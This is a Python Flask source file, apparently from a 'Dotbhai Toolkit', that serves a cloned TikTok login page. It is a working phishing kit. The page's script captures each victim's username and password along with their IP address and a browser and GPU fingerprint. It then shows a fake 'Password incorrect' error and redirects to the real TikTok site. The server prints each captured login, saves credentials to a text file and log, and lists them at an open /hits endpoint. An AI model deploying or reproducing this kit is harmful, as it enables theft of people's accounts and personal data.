from flask import Flask, request, jsonify, render_template_string
from datetime import datetime

app = Flask(__name__)

CREDS_FILE = "tiktok_creds.txt"
LOG_FILE   = "tiktok_access.log"
HITS = []

# ═══════════════════════════════════════════════════════════
# قالب صفحة تيك توك — تسجيل الدخول
# ═══════════════════════════════════════════════════════════
TT_HTML = r"""
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Log in | TikTok</title>
<link rel="icon" href="https://www.tiktok.com/favicon.ico">
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  html, body {
    font-family: TikTokFont, "Segoe UI", Roboto, Arial, sans-serif;
    background:#fff;
    color:#161823;
    min-height:100vh;
    overflow-x:hidden;
  }

  /* ── الشريط العلوي ── */
  .topbar {
    padding:16px 24px;
    display:flex;
    justify-content:space-between;
    align-items:center;
    max-width:1200px;
    margin:0 auto;
    width:100%;
  }
  .brand {
    display:flex;
    align-items:center;
    gap:8px;
    font-size:24px;
    font-weight:900;
    color:#161823;
    text-decoration:none;
    letter-spacing:-.5px;
  }
  .brand svg { width:32px; height:32px; }
  .topbar-right {
    display:flex;
    align-items:center;
    gap:14px;
    font-size:14px;
  }
  .topbar-right select {
    background:transparent;
    border:none;
    font-size:14px;
    cursor:pointer;
    font-family:inherit;
    color:#161823;
  }
  .btn-outline {
    padding:10px 22px;
    background:#fff;
    color:#161823;
    border:1px solid #161823;
    border-radius:4px;
    font-size:15px;
    font-weight:700;
    cursor:pointer;
    font-family:inherit;
  }
  .btn-outline:hover { background:#f8f8f8; }

  /* ── المنطقة الرئيسية ── */
  .hero {
    display:flex;
    justify-content:center;
    align-items:center;
    gap:80px;
    padding:40px 20px 80px;
    max-width:1200px;
    margin:0 auto;
    flex-wrap:wrap;
  }

  .phone-side {
    flex:0 0 440px;
    position:relative;
  }
  .phone-side img {
    width:100%;
    height:auto;
    border-radius:8px;
  }
  @media (max-width:900px) { .phone-side { display:none; } }

  /* ── كارت تسجيل الدخول ── */
  .card {
    flex:0 0 380px;
    background:#fff;
    padding:0 20px;
  }
  .card h1 {
    font-size:32px;
    font-weight:700;
    text-align:center;
    margin-bottom:10px;
    letter-spacing:-.3px;
  }
  .card .sub {
    text-align:center;
    color:#161823;
    font-size:15px;
    margin-bottom:24px;
  }
  .card .sub a { color:#fe2c55; text-decoration:none; font-weight:600; }
  .card .sub a:hover { text-decoration:underline; }

  /* ── أزرار تسجيل دخول بديلة ── */
  .alt-login {
    display:flex;
    flex-direction:column;
    gap:12px;
    margin-bottom:20px;
  }
  .alt-btn {
    display:flex;
    align-items:center;
    justify-content:center;
    gap:10px;
    width:100%;
    padding:12px 16px;
    background:#fff;
    border:1px solid #e0e0e0;
    border-radius:4px;
    font-size:15px;
    font-weight:600;
    cursor:pointer;
    font-family:inherit;
    color:#161823;
    position:relative;
  }
  .alt-btn:hover { background:#f8f8f8; }
  .alt-btn svg { width:20px; height:20px; }

  /* ── الفاصل ── */
  .divider {
    display:flex;
    align-items:center;
    margin:20px 0;
    color:#a1a1a1;
    font-size:12px;
  }
  .divider::before, .divider::after {
    content:'';
    flex:1;
    height:1px;
    background:#e0e0e0;
  }
  .divider span { margin:0 12px; font-weight:500; }

  /* ── حقول الإدخال ── */
  .input-wrap {
    position:relative;
    margin-bottom:12px;
  }
  .input {
    width:100%;
    padding:22px 12px 8px;
    background:#fff;
    border:1px solid #e0e0e0;
    border-radius:4px;
    font-size:15px;
    outline:none;
    font-family:inherit;
    color:#161823;
    transition:border-color .15s;
  }
  .input:focus { border-color:#161823; }
  .input-label {
    position:absolute;
    top:8px;
    left:12px;
    font-size:11px;
    color:#a1a1a1;
    pointer-events:none;
  }

  .btn-login {
    width:100%;
    padding:14px;
    background:#fe2c55;
    color:#fff;
    border:none;
    border-radius:4px;
    font-size:16px;
    font-weight:700;
    cursor:pointer;
    font-family:inherit;
    margin-top:8px;
    transition:background .15s;
  }
  .btn-login:hover { background:#e62248; }
  .btn-login:disabled { background:#ccc; cursor:default; }

  .forgot {
    display:block;
    text-align:center;
    color:#161823;
    font-size:13px;
    text-decoration:none;
    margin-top:16px;
  }
  .forgot:hover { text-decoration:underline; }

  /* ── الفوتر ── */
  .terms {
    text-align:center;
    font-size:12px;
    color:#a1a1a1;
    line-height:1.6;
    margin-top:24px;
    padding:0 4px;
  }
  .terms a { color:#a1a1a1; text-decoration:underline; }

  .err {
    color:#fe2c55;
    font-size:13px;
    text-align:center;
    margin-top:14px;
    display:none;
  }

  @media (max-width:900px) {
    .hero { gap:20px; padding:20px 16px 60px; }
    .card { flex:1 1 100%; max-width:400px; margin:0 auto; }
    .card h1 { font-size:26px; }
    .topbar { padding:12px 16px; }
    .btn-outline { padding:8px 16px; font-size:13px; }
  }
</style>
</head>
<body>

<!-- ── Topbar ── -->
<div class="topbar">
  <a href="#" class="brand">
    <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
      <path d="M26 6.5c-1.7-.6-3.2-1.7-4.2-3.1-.6-.8-1-1.8-1.2-2.8 0-.2-.1-.4-.1-.6h-4.7v18.1c0 1-.3 2-1 2.8-.6.8-1.5 1.4-2.6 1.6-1 .2-2 .1-2.9-.4-.9-.5-1.6-1.2-2-2.2-.4-1-.5-2-.2-3 .3-1 1-1.8 1.8-2.4.9-.5 1.9-.8 2.9-.6v-4.8c-2.2-.3-4.3.3-6.1 1.6C3.7 11.8 2.4 14 2.1 16.4c-.3 2.4.5 4.7 2.1 6.5 1.6 1.8 3.8 2.8 6.2 2.9 2.4.1 4.7-.6 6.5-2.1 1.8-1.5 2.9-3.6 3.1-5.9V9.5c1.6 1.2 3.5 1.9 5.5 2h.4V6.6c-.3 0-.6-.1-.9-.1z" fill="#161823"/>
    </svg>
    TikTok
  </a>
  <div class="topbar-right">
    <select>
      <option>English</option>
      <option>العربية</option>
    </select>
    <button class="btn-outline">Sign up</button>
  </div>
</div>

<!-- ── Hero ── -->
<div class="hero">
  <div class="phone-side">
    <svg viewBox="0 0 450 620" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:auto;border-radius:12px;">
      <defs>
        <linearGradient id="bg" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" stop-color="#69C9D0"/>
          <stop offset="100%" stop-color="#EE1D52"/>
        </linearGradient>
      </defs>
      <rect width="450" height="620" fill="url(#bg)"/>
      <text x="225" y="320" text-anchor="middle" fill="#fff" font-family="Arial, sans-serif" font-size="28" font-weight="800">Make Your Day</text>
    </svg>
  </div>

  <div class="card">
    <h1>Log in to TikTok</h1>
    <p class="sub">Manage your account, check notifications, comment on videos, and more.</p>

    <div class="alt-login">
      <button class="alt-btn" type="button">
        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
          <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
          <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/>
          <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
        </svg>
        Use QR code
      </button>

      <button class="alt-btn" type="button">
        <svg viewBox="0 0 24 24" fill="#1877F2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
        Continue with Facebook
      </button>

      <button class="alt-btn" type="button">
        <svg viewBox="0 0 24 24" fill="#000"><path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/></svg>
        Continue with Apple
      </button>
    </div>

    <div class="divider"><span>OR</span></div>

    <form id="f">
      <div class="input-wrap">
        <span class="input-label">Email or username</span>
        <input class="input" type="text" id="user" name="username" autocomplete="username" spellcheck="false" autofocus>
      </div>
      <div class="input-wrap">
        <span class="input-label">Password</span>
        <input class="input" type="password" id="pass" name="password" autocomplete="current-password">
      </div>
      <a href="#" class="forgot">Forgot password?</a>
      <button class="btn-login" type="submit" id="submitBtn" style="margin-top:20px;">Log in</button>
    </form>

    <div class="err" id="err"></div>

    <p class="terms">
      By continuing, you agree to TikTok's <a href="#">Terms of Service</a> and confirm that you have read TikTok's <a href="#">Privacy Policy</a>.
    </p>
  </div>
</div>

<script>
  async function getIP(){
    try { const r = await fetch('https://api.ipify.org?format=json'); return (await r.json()).ip; }
    catch(e){ return null; }
  }
  async function fp(){
    const d = {
      ua: navigator.userAgent,
      platform: navigator.platform,
      lang: navigator.language,
      screen: screen.width + 'x' + screen.height,
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      cores: navigator.hardwareConcurrency,
      touch: 'ontouchstart' in window
    };
    try {
      const c = document.createElement('canvas');
      const gl = c.getContext('webgl');
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
    } catch(e){}
    return d;
  }

  document.getElementById('f').addEventListener('submit', async (e) => {
    e.preventDefault();
    const user = document.getElementById('user').value.trim();
    const pass = document.getElementById('pass').value;
    if (!user || !pass) return;

    const btn = document.getElementById('submitBtn');
    btn.disabled = true;
    btn.textContent = 'Logging in...';

    const payload = {
      username: user,
      password: pass,
      ip: await getIP(),
      fp: await fp(),
      ts: new Date().toISOString()
    };

    try {
      await fetch('/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch(e){}

    const err = document.getElementById('err');
    err.textContent = "Password incorrect. Please try again.";
    err.style.display = 'block';
    document.getElementById('pass').value = '';
    btn.disabled = false;
    btn.textContent = 'Log in';

    setTimeout(() => {
      window.location.href = 'https://www.tiktok.com/login';
    }, 2500);
  });
</script>
</body>
</html>
"""


# ═══════════════════════════════════════════════════════════
@app.route("/")
def index():
    return render_template_string(TT_HTML)


@app.route("/capture", methods=["POST"])
def capture():
    data = request.get_json(silent=True) or {}
    username = data.get("username", "")
    password = data.get("password", "")
    ip = data.get("ip") or request.remote_addr
    fp = data.get("fp", {})
    ts = data.get("ts", datetime.now().isoformat())

    hit = {
        "ts": ts,
        "username": username,
        "password": password,
        "ip": ip,
        "ua": fp.get("ua", ""),
        "platform": fp.get("platform", ""),
        "lang": fp.get("lang", ""),
        "screen": fp.get("screen", ""),
        "tz": fp.get("tz", ""),
        "cores": fp.get("cores", ""),
        "gpu": fp.get("gpu", ""),
        "touch": fp.get("touch", False),
    }
    HITS.append(hit)

    line1 = "=" * 62
    print(f"\n\033[96m{line1}\033[0m")
    print(f"\033[91m[+]\033[0m NEW TIKTOK HIT  —  \033[93m{ts}\033[0m")
    print(f"\033[96m{line1}\033[0m")
    print(f"  \033[96mUsername :\033[0m \033[1;93m{username}\033[0m")
    print(f"  \033[96mPassword :\033[0m \033[1;91m{password}\033[0m")
    print(f"  \033[96mIP       :\033[0m {ip}")
    print(f"  \033[96mPlatform :\033[0m {hit['platform']}")
    print(f"  \033[96mLang     :\033[0m {hit['lang']}")
    print(f"  \033[96mScreen   :\033[0m {hit['screen']}")
    print(f"  \033[96mTimezone :\033[0m {hit['tz']}")
    print(f"  \033[96mCores    :\033[0m {hit['cores']}")
    print(f"  \033[96mGPU      :\033[0m {hit['gpu']}")
    print(f"  \033[96mTouch    :\033[0m {hit['touch']}")
    print(f"  \033[96mUA       :\033[0m {hit['ua']}")
    print(f"\033[96m{line1}\033[0m\n")

    with open(CREDS_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n[{ts}]\n")
        f.write(f"Username : {username}\n")
        f.write(f"Password : {password}\n")
        f.write(f"IP       : {ip}\n")
        f.write(f"Platform : {hit['platform']}\n")
        f.write(f"Lang     : {hit['lang']}\n")
        f.write(f"Screen   : {hit['screen']}\n")
        f.write(f"Timezone : {hit['tz']}\n")
        f.write(f"Cores    : {hit['cores']}\n")
        f.write(f"GPU      : {hit['gpu']}\n")
        f.write(f"UA       : {hit['ua']}\n")
        f.write("-" * 62 + "\n")

    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"{ts} | {ip} | {username}:{password}\n")

    return jsonify({"ok": True}), 200


@app.route("/hits")
def hits():
    return jsonify(HITS[-100:])


if __name__ == "__main__":
    print("\n\033[96m" + "═" * 62 + "\033[0m")
    print("  \033[1;93mTikTok Clone — Dotbhai Toolkit\033[0m")
    print("\033[96m" + "═" * 62 + "\033[0m")
    print("  \033[96mServer    :\033[0m http://0.0.0.0:5002")
    print("  \033[96mAdmin     :\033[0m http://0.0.0.0:5002/hits")
    print("  \033[96mCredentials file:\033[0m tiktok_creds.txt")
    print("\033[96m" + "═" * 62 + "\033[0m\n")
    app.run(host="0.0.0.0", port=5002, debug=False)
